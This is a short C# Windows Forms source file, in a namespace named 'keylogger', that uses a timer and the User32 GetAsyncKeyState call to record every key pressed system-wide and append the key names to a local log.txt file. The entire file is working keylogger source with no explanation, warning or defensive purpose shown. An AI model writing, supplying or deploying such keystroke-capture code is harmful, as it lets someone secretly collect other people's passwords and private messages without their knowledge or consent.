using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace keylogger
{
    public partial class Form1 : Form
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int key);
        string s = "";

        public Form1()
        {
            InitializeComponent();
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string buffer = "";
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    buffer += Enum.GetName(typeof(Keys), i);
                }
            }
            s += buffer;
            if (s.Length > 10)
            {
                Log(s);
                s = "";
            }
        }

        private void Log(string s)
        {
            StreamWriter sw = new StreamWriter("log.txt", true);
            sw.Write(s);
            sw.Close();
        }
    }
}
